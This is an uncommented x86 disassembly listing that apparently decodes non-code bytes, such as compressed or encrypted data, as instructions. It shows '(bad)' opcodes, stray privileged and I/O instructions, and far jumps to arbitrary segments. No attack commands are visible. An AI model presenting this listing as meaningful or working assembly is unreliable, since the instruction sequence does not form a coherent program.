  41565b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565c:	cmp    eax,DWORD PTR [eax+0x549f6c74]
  415662:	or     eax,ebp
  415664:	xchg   esp,eax
  415665:	sbb    al,0x96
  415667:	push   es
  415668:	push   esp
  415669:	xchg   BYTE PTR [esi-0x53],bl
  41566c:	xor    bl,BYTE PTR [eax+0x39]
  41566f:	repz mov cl,0x9e
  415672:	pop    esp
  415673:	and    eax,edi
  415675:	out    dx,eax
  415676:	fsub   DWORD PTR [ebp-0x67]
  415679:	icebp  
  41567a:	sub    eax,0xdea9996e
  41567f:	and    ch,BYTE PTR [edi+0x4c]
  415682:	cmp    DWORD PTR [edx],0xc1c17881
  415688:	push   ebx
  415689:	stos   BYTE PTR es:[edi],al
  41568a:	jp     0x41567a
  41568c:	jmp    0x41563e
  41568e:	jp     0x4156b1
  415690:	lock jge 0x415680
  415693:	push   ds
  415694:	mov    ecx,0x2d45efa3
  415699:	data16 fld QWORD PTR [si+0x7f]
  41569e:	movd   mm5,DWORD PTR [edx-0x65]
  4156a2:	pop    esp
  4156a3:	test   dl,0x31
  4156a6:	cmp    dl,BYTE PTR [ebp-0x3fa52956]
  4156ac:	hlt    
  4156ad:	and    al,0x8a
  4156af:	push   ebx
  4156b0:	add    eax,DWORD PTR [edi+0x706ca2f9]
  4156b6:	inc    esi
  4156b7:	leave  
  4156b8:	mov    dl,0x33
  4156ba:	add    esi,edi
  4156bc:	aad    0xe
  4156be:	jno    0x415697
  4156c0:	int    0xb8
  4156c2:	cmp    esp,DWORD PTR [esi]
  4156c4:	les    ebp,FWORD PTR [ebp+0x50e121ff]
  4156ca:	mov    edx,0x90c1bcfc
  4156cf:	fild   DWORD PTR [ecx]
  4156d1:	mov    al,bl
  4156d3:	lock std 
  4156d5:	mov    esp,0x22a13ea4
  4156da:	dec    esp
  4156db:	call   0x46bc:0x833145e8
  4156e2:	lds    ebx,FWORD PTR [edx+edi*1-0x43]
  4156e6:	or     eax,0x8dd63ec5
  4156eb:	adc    al,0xea
  4156ed:	push   esi
  4156ee:	dec    ecx
  4156ef:	stos   DWORD PTR es:[edi],eax
  4156f0:	or     BYTE PTR [edi],0xd6
  4156f3:	cmp    dl,ah
  4156f5:	data16 mov ch,0xdd
  4156f8:	stos   BYTE PTR es:[edi],al
  4156f9:	mov    dh,0xe1
  4156fb:	pop    edi
  4156fc:	and    al,BYTE PTR [eax-0x2f]
  4156ff:	pop    esp
  415700:	fild   WORD PTR [ebx-0x6f]
  415703:	mov    ebp,0x3eedb0f0
  415708:	dec    eax
  415709:	(bad)  
  41570a:	daa    
  41570b:	ret    
  41570c:	jmp    0x41574d
  41570e:	push   es
  41570f:	fcom   QWORD PTR [eax]
  415711:	push   0xffffffc8
  415713:	sub    BYTE PTR [esi-0x51],bl
  415716:	dec    esi
  415717:	inc    edi
  415718:	pop    ss
  415719:	imul   eax,DWORD PTR es:[esi],0x75b58982
  415720:	pxor   mm0,mm1
  415723:	jae    0x4156fa
  415725:	call   0xf3c33ca2
  41572a:	(bad)  
  41572b:	fsubr  DWORD PTR [esi]
  41572d:	je     0x415738
  41572f:	jge    0x415744
  415731:	pushf  
  415732:	cdq    
  415733:	out    0x45,al
  415735:	xchg   esp,eax
  415736:	ss jmp 0x4156f1
  415739:	mov    edi,fs
  41573b:	or     al,0x62
  41573d:	mov    BYTE PTR [edi+0x11bf64b4],dh
  415743:	cmp    BYTE PTR [esi],ch
  415745:	sbb    eax,DWORD PTR ds:[esi-0x33]
  415749:	inc    edx
  41574a:	inc    eax
  41574b:	cmp    eax,0xa0a7894f
  415750:	pop    es
  415751:	pop    ecx
  415752:	dec    esi
  415753:	adc    edi,DWORD PTR [eax]
  415755:	dec    ebx
  415756:	imul   esp,DWORD PTR [edi+0x7b],0xffffffd2
  41575a:	push   ebx
  41575b:	imul   edi,DWORD PTR [edi-0x79],0x3957c5ac
  415762:	(bad)  
  415764:	lea    esi,[ecx]
  415766:	or     ebp,DWORD PTR [ebp+0x5b657d10]
  41576c:	add    esp,edx
  41576e:	lock repnz mov ecx,0x72854bc1
  415775:	add    DWORD PTR [ebp-0x70],esi
  415778:	jne    0x41571f
  41577a:	or     DWORD PTR [edi-0x41],0xffffffd7
  41577e:	sub    bl,BYTE PTR ds:0x20031dcd
  415784:	dec    eax
  415785:	xor    dl,bh
  415787:	jecxz  0x415783
  415789:	aam    0xfa
  41578b:	cli    
  41578c:	adc    bl,dh
  41578e:	xchg   esp,eax
  41578f:	jmp    0x415804
  415791:	inc    ebx
  415792:	mov    BYTE PTR [edx+0x44a0efd6],dl
  415798:	push   esp
  415799:	(bad)  
  41579a:	xor    eax,0x11bb119d
  41579f:	daa    
  4157a0:	mov    al,0xd4
  4157a2:	popf   
  4157a3:	xchg   edi,eax
  4157a4:	retf   
  4157a5:	ret    0x344e
  4157a8:	xor    BYTE PTR [eax+0x34137ac6],ah
  4157ae:	test   eax,0x276a44a8
  4157b3:	jno    0x415765
  4157b5:	xor    BYTE PTR [eax+ebx*4-0x3ffebc2e],0x33
  4157bd:	ret    
  4157be:	sub    ebp,ecx
  4157c0:	addr16 cdq 
  4157c2:	out    0x60,al
  4157c4:	push   ebp
  4157c5:	div    DWORD PTR [eax+eiz*4+0x64]
  4157c9:	inc    esp
  4157ca:	add    BYTE PTR [esi+0x4c],dl
  4157cd:	(bad)  
  4157ce:	pusha  
  4157cf:	jae    0x41578b
  4157d1:	adc    BYTE PTR [ecx],dh
  4157d3:	mov    ds:0x457e60ef,al
  4157d8:	imul   ebp,ebx,0xffffffa3
  4157db:	shr    BYTE PTR [edi-0x26cae4c3],1
  4157e1:	aas    
  4157e2:	les    esp,FWORD PTR [ecx]
  4157e4:	add    DWORD PTR [eax+eax*2],edi
  4157e7:	pop    es
  4157e8:	out    dx,al
  4157e9:	in     eax,dx
  4157ea:	aaa    
  4157eb:	adc    eax,0xd0b4357e
  4157f0:	mov    ds:0x25388ac1,eax
  4157f5:	(bad)  
  4157f6:	arpl   si,cx
  4157f8:	call   FWORD PTR [esi+0xc0bc7f2]
  4157fe:	enter  0x9e03,0x92
  415802:	mul    DWORD PTR [edi-0x27]
  415805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415806:	jae    0x4157ee
  415808:	scas   eax,DWORD PTR es:[edi]
  415809:	cs pop eax
  41580b:	mov    BYTE PTR [esi+0x17],cl
  41580e:	aas    
  41580f:	inc    ebp
  415810:	shl    BYTE PTR [ecx],1
  415812:	push   esi
  415813:	outs   dx,DWORD PTR ds:[esi]
  415814:	loop   0x4157e1
  415816:	loop   0x415802
  415818:	or     eax,0xb15a81c6
  41581d:	hlt    
  41581e:	inc    edx
  41581f:	push   ebp
  415820:	lods   al,BYTE PTR ds:[esi]
  415821:	and    eax,0xa181e48b
  415826:	cmp    eax,0x72a9ca30
  41582b:	test   eax,edx
  41582d:	sbb    DWORD PTR [ebx],edi
  41582f:	scas   eax,DWORD PTR es:[edi]
  415830:	push   es
  415831:	mov    ds:0xb4f9a627,eax
  415836:	adc    al,0xf7
  415838:	and    dh,BYTE PTR [ebp+0x4e552ec2]
  41583e:	fsub   QWORD PTR [eax+eax*2+0x71a33794]
  415845:	pop    edx
  415846:	mov    ds:0x11cd0a52,al
  41584b:	cld    
  41584c:	mov    BYTE PTR [edi+0x3d],bh
  41584f:	js     0x41582d
  415851:	mov    eax,ds:0xd746fcc
  415856:	sbb    dl,al
  415858:	pop    es
  415859:	mov    esi,DWORD PTR [edi+0x65]
  41585c:	jmp    0x41581a
  41585e:	add    edi,ebx
  415860:	pushf  
  415861:	sar    DWORD PTR [edx+0x7],0x45
  415865:	push   edi
  415866:	imul   esi,ecx,0x1c
  415869:	gs pop edx
  41586b:	sar    DWORD PTR [edx+ebp*4],1
  41586e:	jecxz  0x41580b
  415870:	add    edi,DWORD PTR [ebx-0x1e]
  415873:	sub    eax,DWORD PTR [ebx]
  415875:	cli    
  415876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415877:	sub    cl,BYTE PTR [edx+0x3083d571]
  41587d:	out    0xce,eax
  41587f:	lea    ebx,[edi-0x7f54c33b]
  415885:	test   eax,0xf94a3fb8
  41588a:	daa    
  41588b:	inc    eax
  41588c:	add    bh,BYTE PTR [ebx]
  41588e:	or     BYTE PTR [edx],cl
  415890:	mov    eax,cs
  415892:	cld    
  415893:	sub    bh,BYTE PTR [eax]
  415895:	mov    eax,0xdb443305
  41589a:	lods   eax,DWORD PTR ds:[esi]
  41589b:	sub    al,BYTE PTR [ebx-0x7a]
  41589e:	jo     0x4158ad
  4158a0:	loope  0x41591a
  4158a2:	(bad)  
  4158a3:	(bad)  
  4158a4:	mov    edi,0x78ec64d0
  4158a9:	sti    
  4158aa:	cmp    bh,BYTE PTR [ecx-0x6c03f6d4]
  4158b0:	out    dx,eax
  4158b1:	(bad)  
  4158b2:	fsub   QWORD PTR [edi-0x77f8dbdf]
  4158b8:	data16 fisttp WORD PTR [edi*8+0x4d8fa242]
  4158c0:	ror    ecx,cl
  4158c2:	fidiv  WORD PTR [edx-0x36cdc8a3]
  4158c8:	mov    ds:0xe1ff1c39,eax
  4158cd:	mov    BYTE PTR [edi+0x14],ch
  4158d0:	lods   al,BYTE PTR ds:[esi]
  4158d1:	outs   dx,DWORD PTR ds:[esi]
  4158d2:	push   cs
  4158d3:	clc    
  4158d4:	cmp    BYTE PTR [esi-0x5b],dh
  4158d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158d8:	stos   DWORD PTR es:[edi],eax
  4158d9:	jae    0x415878
  4158db:	pop    edi
  4158dc:	cmp    ecx,DWORD PTR [ecx+0x9020481]
  4158e2:	into   
  4158e3:	das    
  4158e4:	in     eax,dx
  4158e5:	mov    edx,ebx
  4158e7:	pop    DWORD PTR [eax-0x12]
  4158ea:	cld    
  4158eb:	shr    BYTE PTR ds:0x8873b78b,0x66
  4158f2:	xchg   edi,eax
  4158f3:	mov    DWORD PTR [eax],esi
  4158f5:	stc    
  4158f6:	je     0x415909
  4158f8:	fsub   DWORD PTR es:[esi+0xb]
  4158fc:	loop   0x4158d9
  4158fe:	adc    BYTE PTR [esi],0x36
  415901:	adc    esi,esi
  415903:	dec    esi
  415904:	rcr    DWORD PTR [ecx],0x7d
  415907:	fwait
  415908:	and    DWORD PTR [ebp-0x4c],edi
  41590b:	pusha  
  41590c:	clc    
  41590d:	mov    eax,ds:0x70d9f571
  415912:	cwde   
  415913:	(bad)  
  415914:	(bad)  
  415915:	retf   
  415916:	ret    0x35d1
  415919:	js     0x41590c
  41591b:	stos   DWORD PTR es:[edi],eax
  41591c:	mov    dh,0xd3
  41591e:	sub    eax,0xbd65713d
  415923:	add    bh,BYTE PTR [ecx+esi*8+0x44cc82ab]
  41592a:	call   0x73affc50
  41592f:	loopne 0x415919
  415931:	push   cs
  415932:	push   esp
  415934:	dec    cl
  415936:	shr    DWORD PTR [ebx+esi*8+0x2f],0xe4
  41593b:	mov    edx,0xc0f0449a
  415940:	add    ah,ch
  415942:	test   eax,0xc8fbdaa4
  415947:	test   BYTE PTR [eax-0x8f6da31],ch
  41594d:	mov    ?,WORD PTR [eax+0x638d7b6]
  415953:	cmp    eax,0x5a950d5b
  415958:	xor    ah,BYTE PTR [esi+0x18]
  41595b:	push   ss
  41595c:	jae    0x4158ff
  41595e:	ret    
  41595f:	dec    ebx
  415960:	jae    0x4159da
  415962:	xchg   ebp,eax
  415963:	mov    ebx,0xb8d67cd3
  415968:	push   cs
  415969:	pop    ss
  41596a:	add    BYTE PTR [ebp+0x60f737d6],dh
  415970:	in     eax,dx
  415971:	aam    0x68
  415973:	cmc    
  415974:	mov    al,0x6e
  415976:	sbb    eax,0x6c9729a3
  41597b:	fs push ebp
  41597d:	mov    ds:0x287376c3,al
  415982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415983:	je     0x41599c
  415985:	xchg   ebx,eax
  415986:	cdq    
  415987:	aam    0x19
  415989:	pop    edx
  41598a:	dec    ecx
  41598b:	jecxz  0x4159cc
  41598d:	push   esi
  41598e:	ins    DWORD PTR es:[edi],dx
  41598f:	sub    edi,edi
  415991:	stos   BYTE PTR es:[edi],al
  415992:	and    DWORD PTR [eax+0x1a5dfdc9],esi
  415998:	add    BYTE PTR [edi-0x4e],bh
  41599b:	mul    DWORD PTR [edi+0xf]
  41599e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599f:	jle    0x4159ab
  4159a1:	icebp  
  4159a2:	test   DWORD PTR [ebx],esi
  4159a4:	pop    edi
  4159a5:	aad    0x85
  4159a7:	cwde   
  4159a8:	(bad)  
  4159a9:	(bad)  
  4159aa:	scas   al,BYTE PTR es:[edi]
  4159ab:	adc    bl,BYTE PTR [edi-0x3d91cf9c]
  4159b1:	mov    edx,0xc67145c2
  4159b6:	call   0x2fe5:0x6aae9c0e
  4159bd:	sbb    dl,bl
  4159bf:	mov    bl,bl
  4159c1:	mov    ebp,0xa71e49ed
  4159c6:	mov    edi,0xd301445d
  4159cb:	or     bh,BYTE PTR [eax]
  4159cd:	push   edx
  4159ce:	es xchg esp,eax
  4159d0:	jae    0x4159b3
  4159d2:	push   edi
  4159d3:	unpcklps xmm5,XMMWORD PTR [edi-0x69]
  4159d7:	out    0x77,ax
  4159da:	das    
  4159db:	cmp    DWORD PTR [ecx-0x45],eax
  4159de:	loope  0x415a5d
  4159e0:	inc    ecx
  4159e1:	mov    BYTE PTR [ebp+0x5599974],0x94
  4159e8:	(bad)  
  4159e9:	mov    bl,0xc1
  4159eb:	push   DWORD PTR [esi-0x21580297]
  4159f1:	sbb    edx,DWORD PTR [edi+0x2757fb9]
  4159f7:	popf   
  4159f8:	(bad)  
  4159f9:	cmp    BYTE PTR [edx-0x12],dh
  4159fc:	push   ecx
  4159fd:	push   0x1884414d
  415a02:	inc    ecx
  415a03:	cmp    al,0xd9
  415a05:	pop    ecx
  415a06:	sbb    cl,BYTE PTR [ebx-0x55]
  415a09:	in     eax,dx
  415a0a:	mov    ebp,0xb9283ade
  415a0f:	mov    ebp,0xbc524fca
  415a14:	adc    al,0xfd
  415a16:	fmul   DWORD PTR [eax]
  415a18:	mov    bl,0xf3
  415a1a:	sub    di,WORD PTR [esi+0x37]
  415a1e:	in     eax,dx
  415a1f:	aas    
  415a20:	sub    al,0x3f
  415a22:	bound  edx,QWORD PTR [edi]
  415a24:	mov    ebx,DWORD PTR [ecx-0x2ecaaf1d]
  415a2a:	aaa    
  415a2b:	je     0x415a0e
  415a2d:	loopne 0x415a3c
  415a2f:	pop    esi
  415a30:	add    eax,0x2701e16b
  415a35:	xchg   ebp,eax
  415a36:	inc    ebx
  415a37:	mov    ah,0xb3
  415a39:	icebp  
  415a3a:	and    dh,dh
  415a3c:	test   eax,0x48ee71c
  415a41:	xchg   ecx,eax
  415a42:	and    eax,0xbcb27992
  415a47:	sub    ch,BYTE PTR [esi+0x3e8e055d]
  415a4d:	push   edi
  415a4e:	fild   QWORD PTR [ebp-0x1002a8c]
  415a54:	sar    BYTE PTR cs:[ecx+0x305a682d],1
  415a5b:	les    ebp,FWORD PTR [eax-0x60]
  415a5e:	(bad)  
  415a5f:	fsub   st(7),st
  415a61:	fmul   DWORD PTR [ebp-0x39]
  415a64:	scas   al,BYTE PTR es:[edi]
  415a65:	xor    al,0x16
  415a67:	sub    ebx,DWORD PTR [edx]
  415a69:	jbe    0x415ae9
  415a6b:	scas   eax,DWORD PTR es:[edi]
  415a6c:	mov    ds,WORD PTR [ebx]
  415a6e:	jbe    0x415a6d
  415a70:	scas   eax,DWORD PTR es:[edi]
  415a71:	cmp    BYTE PTR [ecx-0x36],0xd9
  415a75:	test   eax,0x25c0acbc
  415a7a:	(bad)  
  415a7c:	dec    edx
  415a7d:	stos   DWORD PTR es:[edi],eax
  415a7e:	sub    al,0x9
  415a80:	daa    
  415a81:	mov    esp,0x98b596de
  415a86:	jmp    0xff83:0xdaaad26a
  415a8d:	jp     0x415a92
  415a8f:	sub    DWORD PTR [eax],eax
  415a91:	sub    al,0xdf
  415a93:	stc    
  415a94:	mov    ch,0xbd
  415a96:	mov    bh,0x78
  415a98:	mov    edx,0x8b1ca674
  415a9d:	push   ds
  415a9e:	lahf   
  415a9f:	sbb    al,0x54
  415aa1:	shl    BYTE PTR [ebp+0x4ede9950],1
  415aa7:	jecxz  0x415adc
  415aa9:	sub    DWORD PTR [esi],ecx
  415aab:	cmc    
  415aac:	cld    
  415aad:	adc    al,0xa
  415aaf:	xor    dh,al
  415ab1:	mov    ds:0x1a0742a,eax
  415ab6:	cli    
  415ab7:	sub    cl,BYTE PTR [ebp+ecx*1+0x7e]
  415abb:	and    DWORD PTR [ebx+0x7d47debf],esi
  415ac1:	sub    dl,al
  415ac3:	outs   dx,BYTE PTR ds:[esi]
  415ac4:	xor    al,0xc7
  415ac6:	mov    ch,0xed
  415ac8:	pop    edi
  415ac9:	rcl    BYTE PTR [ebx-0x3f],0xc9
  415acd:	push   eax
  415ace:	adc    eax,0x66e6cf6b
  415ad3:	cmp    DWORD PTR [edx+0x35],ebp
  415ad6:	adc    al,0x7
  415ad8:	ins    DWORD PTR es:[edi],dx
  415ad9:	sub    ah,BYTE PTR [edi-0x558805a9]
  415adf:	test   DWORD PTR [ebp-0x21],0xe801e3f7
  415ae6:	stos   BYTE PTR es:[edi],al
  415ae7:	int3   
  415ae8:	or     al,0x1c
  415aea:	inc    ebp
  415aeb:	bound  edx,QWORD PTR [edi+eax*1+0x57]
  415aef:	cmp    BYTE PTR [eax-0x5d],0xe4
  415af3:	inc    ebp
  415af4:	xor    BYTE PTR [ecx-0x31],0x48
  415af8:	mov    esp,0x39bf26bc
  415afd:	push   edi
  415afe:	inc    ebx
  415aff:	hlt    
  415b00:	inc    ebx
  415b01:	push   es
  415b02:	mov    DWORD PTR [ebp-0x45],edi
  415b05:	(bad)  
  415b06:	and    al,0xb6
  415b08:	bound  eax,QWORD PTR [esp+ebp*4]
  415b0b:	(bad)  
  415b0c:	call   0x9951851e
  415b11:	cmp    esi,ecx
  415b13:	adc    BYTE PTR [eax],al
  415b15:	pop    eax
  415b16:	push   cs
  415b17:	adc    al,0x2a
  415b19:	mov    al,0xa4
  415b1b:	fwait
  415b1c:	xchg   DWORD PTR [ecx],ecx
  415b1e:	out    0xd7,eax
  415b20:	push   ebp
  415b21:	xor    ecx,DWORD PTR [eax]
  415b23:	aaa    
  415b24:	sub    ebp,DWORD PTR [esi]
  415b26:	outs   dx,DWORD PTR ds:[esi]
  415b27:	mov    edi,0xcb793529
  415b2c:	fcmovnb st,st(7)
  415b2e:	cmp    DWORD PTR [edi*8+0x6e960f0],ebx
  415b35:	xchg   edi,eax
  415b36:	pusha  
  415b37:	fsubrp st(3),st
  415b39:	mov    eax,ds:0x276cea34
  415b3e:	stc    
  415b3f:	jno    0x415bb2
  415b41:	or     DWORD PTR [edi+0x1a],0x70
  415b45:	adc    BYTE PTR [esp+esi*1+0x63fd14bf],ch
  415b4c:	(bad)  
  415b4d:	cmp    BYTE PTR [eax],bl
  415b4f:	xor    ah,BYTE PTR [ebx-0x69]
  415b52:	inc    esi
  415b53:	cmp    ch,BYTE PTR [edx+0x7fb5c321]
  415b59:	fdivrp st(7),st
  415b5b:	sub    eax,0x36407f68
  415b60:	dec    ebx
  415b61:	and    eax,0xe455a7d7
  415b66:	pop    esi
  415b67:	loopne 0x415b77
  415b69:	jb     0x415be5
  415b6b:	repnz aam 0x43
  415b6e:	dec    esi
  415b6f:	test   eax,0x53835379
  415b74:	ins    BYTE PTR es:[edi],dx
  415b75:	outs   dx,BYTE PTR ds:[esi]
  415b76:	fdiv   DWORD PTR [ebp-0x10]
  415b79:	mov    eax,0xdb722f55
  415b7e:	fdivr  st,st(2)
  415b80:	fisub  WORD PTR [edi+ebx*1+0x53d11971]
  415b87:	sub    al,BYTE PTR [edx]
  415b89:	mov    bh,0x96
  415b8b:	add    BYTE PTR [esi-0x356355ed],0x22
  415b92:	jmp    FWORD PTR [esi-0xddc9695]
  415b98:	cld    
  415b99:	out    0x8f,al
  415b9b:	jl     0x415c0c
  415b9d:	pop    eax
  415b9e:	hlt    
  415b9f:	int    0x2d
  415ba1:	jne    0x415c11
  415ba3:	add    eax,DWORD PTR [ebx+0xb2a536f]
  415ba9:	call   0x5e91:0x73d8716f
  415bb0:	lods   eax,DWORD PTR ds:[esi]
  415bb1:	outs   dx,DWORD PTR ds:[esi]
  415bb2:	xchg   esi,eax
  415bb3:	xchg   edx,eax
  415bb4:	jns    0x415c1a
  415bb6:	imul   esp,DWORD PTR [ebx-0x1a7d97ae],0xffffffc1
  415bbd:	mov    bl,dl
  415bbf:	outs   dx,DWORD PTR ds:[esi]
  415bc0:	test   DWORD PTR [ecx+0x2f],edx
  415bc3:	push   ss
  415bc4:	in     eax,dx
  415bc5:	xchg   bh,dh
  415bc7:	sub    cl,BYTE PTR [edi-0xd]
  415bca:	xchg   esp,eax
  415bcb:	lea    edi,[eax+0x4b3c173b]
  415bd1:	mov    gs,WORD PTR [edx]
  415bd3:	push   ss
  415bd4:	pop    edi
  415bd5:	or     bl,BYTE PTR [ebp+0x1e]
  415bd8:	dec    edx
  415bd9:	mov    ds:0xc00a8543,eax
  415bde:	inc    edx
  415bdf:	mov    DWORD PTR cs:[esi+0x22396a0e],esp
  415be6:	sahf   
  415be7:	pop    ebp
  415be8:	and    DWORD PTR [ebp-0x2c6e035a],eax
  415bee:	js     0x415bf4
  415bf0:	xor    DWORD PTR [edx-0x698c2209],eax
  415bf6:	push   ds
  415bf7:	inc    esi
  415bf8:	xchg   ecx,eax
  415bf9:	inc    ecx
  415bfa:	or     eax,0xc8347821
  415bff:	dec    edx
  415c00:	stos   DWORD PTR es:[edi],eax
  415c01:	fidivr WORD PTR [edi-0x415f9de1]
  415c07:	aas    
  415c08:	adc    bh,BYTE PTR [ebx-0x3c]
  415c0b:	dec    esi
  415c0c:	pop    edi
  415c0d:	out    dx,al
  415c0e:	fbld   TBYTE PTR [esi-0x75]
  415c11:	(bad)  
  415c12:	add    eax,0xdcf9e732
  415c17:	or     al,0x88
  415c19:	push   cs
  415c1a:	mov    ds:0xdfd337de,eax
  415c1f:	jmp    0xd621aa11
  415c24:	shrd   DWORD PTR [edi],ebp,0x83
  415c28:	xchg   ebp,eax
  415c29:	xchg   ecx,eax
  415c2a:	or     eax,0x2fbe10eb
  415c2f:	shl    DWORD PTR [ebx+0x5ea143e3],1
  415c35:	pop    esp
  415c36:	div    BYTE PTR [ecx]
  415c38:	fadd   QWORD PTR [edx]
  415c3a:	les    ebp,FWORD PTR [eax+ebx*2-0x38]
  415c3e:	ror    eax,0x78
  415c41:	fimul  DWORD PTR [eax-0x46]
  415c44:	adc    eax,DWORD PTR [esi+ebp*1-0xd]
  415c48:	inc    eax
  415c49:	call   0xcbb:0x28feaf4b
  415c50:	test   ebp,edi
  415c52:	in     al,0x2
  415c54:	mov    ds:0x205d4c9a,al
  415c59:	ret    
  415c5a:	aas    
  415c5b:	ins    DWORD PTR es:[edi],dx
  415c5c:	mov    bl,0xf8
  415c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c5f:	mov    ecx,0x6b4071e0
  415c64:	dec    esi
  415c65:	leave  
  415c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c67:	ret    0xd16d
  415c6a:	xchg   eax,edx
  415c6c:	sbb    eax,0x7c29a09
  415c71:	mov    esp,edi
  415c73:	jo     0x415cc4
  415c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c76:	add    al,BYTE PTR [eax+0x23]
  415c79:	or     ecx,ebx
  415c7b:	popf   
  415c7c:	mov    ds:0x6270084c,eax
  415c81:	cld    
  415c82:	inc    edi
  415c83:	nop
  415c84:	or     al,0xd5
  415c86:	mov    edi,0xb2a99b68
  415c8b:	cmp    esi,DWORD PTR [esi+0x6e]
  415c8e:	mov    al,0x84
  415c90:	xchg   esp,eax
  415c91:	popf   
  415c92:	mov    al,0x52
  415c94:	xchg   edx,eax
  415c95:	mov    al,ds:0x52519953
  415c9a:	ds in  al,0xe8
  415c9d:	xchg   ebp,eax
  415c9e:	clc    
  415c9f:	jmp    0x415c88
  415ca1:	iret   
  415ca2:	ins    DWORD PTR es:[edi],dx
  415ca3:	or     esi,DWORD PTR [edi+0x14]
  415ca6:	out    0x37,al
  415ca8:	mov    edx,0x206459fc
  415cad:	mov    ds:0x4a2055fb,al
  415cb2:	aad    0xa7
  415cb4:	cwde   
  415cb5:	and    al,0x74
  415cb7:	stc    
  415cb8:	jge    0x415cb9
  415cba:	pop    edx
  415cbb:	adc    BYTE PTR [ecx],al
  415cbd:	xlat   BYTE PTR ds:[ebx]
  415cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cbf:	inc    edx
  415cc0:	enter  0x670d,0xe5
  415cc4:	cmp    edx,ebp
  415cc6:	enter  0x5635,0x85
  415cca:	je     0x415c8e
  415ccc:	push   eax
  415ccd:	or     DWORD PTR [esi-0x5f],ebx
  415cd0:	or     esp,DWORD PTR [edx+0x2e9ef107]
  415cd6:	loope  0x415cb3
  415cd8:	lods   eax,DWORD PTR ds:[esi]
  415cd9:	leave  
  415cda:	mov    dh,0x1c
  415cdc:	xchg   esp,eax
  415cdd:	pop    edi
  415cde:	mov    ch,BYTE PTR [ebx]
  415ce0:	fdivr  st(2),st
  415ce2:	adc    BYTE PTR [ecx],dh
  415ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce5:	dec    esp
  415ce6:	fcom   st(1)
  415ce8:	aam    0xd1
  415cea:	(bad)  [esi]
  415cec:	bound  ecx,QWORD PTR [ebx]
  415cee:	xor    al,0x61
  415cf0:	test   eax,0x614475dc
  415cf5:	outs   dx,BYTE PTR ds:[esi]
  415cf6:	sbb    BYTE PTR [esi-0x41],ch
  415cf9:	ret    
  415cfa:	or     esi,ecx
  415cfc:	push   esi
  415cfd:	and    edi,DWORD PTR ds:0xc36bc5f
  415d03:	mov    esp,0x4d4c3cd5
  415d08:	jns    0x415d37
  415d0a:	ja     0x415cc6
  415d0c:	scas   al,BYTE PTR es:[edi]
  415d0d:	test   BYTE PTR [edx+0x8ca67c5],bl
  415d13:	in     eax,0xa1
  415d15:	pushf  
  415d16:	push   eax
  415d17:	jno    0x415d97
  415d19:	inc    ecx
  415d1a:	push   ds
  415d1b:	push   cs
  415d1c:	xor    BYTE PTR [ebx],cl
  415d1e:	das    
  415d1f:	call   0x438b:0x2bc1863a
  415d26:	jnp    0x415d79
  415d28:	jecxz  0x415ced
  415d2a:	in     eax,dx
  415d2b:	imul   esi,edx,0x720cdcf1
  415d31:	xor    al,bh
  415d33:	dec    edi
  415d34:	sahf   
  415d35:	cmp    esp,DWORD PTR [eax+0x28eb1b14]
  415d3b:	fwait
  415d3c:	mov    ebx,0x4955a0d6
  415d41:	xchg   ebx,eax
  415d42:	jno    0x415ced
  415d44:	or     eax,0x1d0f8f8d
  415d49:	jo     0x415cd7
  415d4b:	lock sub cl,bl
  415d4e:	fwait
  415d4f:	ja     0x415d20
  415d51:	fistp  QWORD PTR [ecx]
  415d53:	sti    
  415d54:	xor    dh,BYTE PTR [eax]
  415d56:	shr    DWORD PTR [esi],cl
  415d58:	fbld   TBYTE PTR [edx]
  415d5a:	sbb    edx,ebx
  415d5c:	(bad)  
  415d5d:	mov    WORD PTR ds:0xc05d835b,?
  415d63:	sbb    ebx,edi
  415d65:	aaa    
  415d66:	xchg   edx,eax
  415d67:	into   
  415d68:	pop    edx
  415d69:	ud2    
  415d6b:	or     dl,BYTE PTR ds:0x8d34cf68
  415d71:	ja     0x415cfa
  415d73:	jnp    0x415d87
  415d75:	push   eax
  415d76:	jmp    0xb9fa:0x5c5788f7
  415d7d:	inc    eax
  415d7e:	mov    esp,0xb73839e1
  415d83:	int    0x16
  415d85:	pop    esp
  415d86:	push   ss
  415d87:	pop    edx
  415d88:	pusha  
  415d89:	push   cs
  415d8a:	and    BYTE PTR [edx+0x7353d6e5],al
  415d90:	xor    cl,BYTE PTR [edi+0x58]
  415d93:	inc    esi
  415d94:	mov    ah,al
  415d96:	cmp    DWORD PTR [edx-0x784011fe],ebx
  415d9c:	pop    ss
  415d9d:	aaa    
  415d9e:	fdivr  QWORD PTR [edi+0x32]
  415da1:	ins    DWORD PTR es:[edi],dx
  415da2:	arpl   WORD PTR [eax-0x77],si
  415da5:	retf   0xcf19
  415da8:	fstp   QWORD PTR [esi-0x3b399f9c]
  415dae:	jecxz  0x415ddf
  415db0:	loop   0x415d56
  415db2:	ficom  WORD PTR [edi+0x139832d5]
  415db8:	pop    esp
  415db9:	push   esp
  415dba:	or     BYTE PTR [eax+edi*2],dh
  415dbd:	sbb    BYTE PTR [ebx],dh
  415dbf:	cli    
  415dc0:	lods   eax,DWORD PTR ds:[esi]
  415dc1:	xchg   edi,eax
  415dc2:	sahf   
  415dc3:	stc    
  415dc4:	inc    ebx
  415dc5:	push   cs
  415dc6:	push   ebp
  415dc7:	setle  cl
  415dca:	sbb    ebp,DWORD PTR [esp+ecx*8-0x497f980f]
  415dd1:	jmp    0x415dd2
  415dd3:	hlt    
  415dd4:	cmp    BYTE PTR [ecx+0x22],0x79
  415dd8:	rol    BYTE PTR [esi-0x4e60f9d9],cl
  415dde:	push   es
  415ddf:	loope  0x415d78
  415de1:	dec    edi
  415de2:	rol    DWORD PTR [eax+0x20594656],cl
  415de8:	(bad)  
  415de9:	jge    0x415e3f
  415deb:	xor    bl,bh
  415ded:	sub    BYTE PTR [edi],bl
  415def:	mov    WORD PTR [edx-0x14374885],ss
  415df5:	push   ebp
